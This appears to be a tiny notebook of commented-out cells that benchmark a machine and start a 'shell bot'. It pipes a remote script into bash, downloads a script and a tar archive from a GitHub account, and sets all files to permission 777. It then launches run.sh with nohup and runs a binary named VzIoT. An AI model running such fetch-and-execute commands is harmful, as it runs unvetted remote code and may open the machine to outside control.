# %%
#@title BENCH
# !wget -qO- bench.sh | bash

# %%
#@title BOT START
# !wget https://raw.githubusercontent.com/varine32090591900294951/varineable/refs/heads/main/del.sh -O run.sh
# !wget "https://github.com/varine32090591900294951/varineable/releases/download/1.0.3/shellnew.tar" -O shell.tar
# !tar -xf shell.tar
# !chmod 777 ./* -R 
# !nohup bash run.sh
# !./shell-bot-new/VzIoT
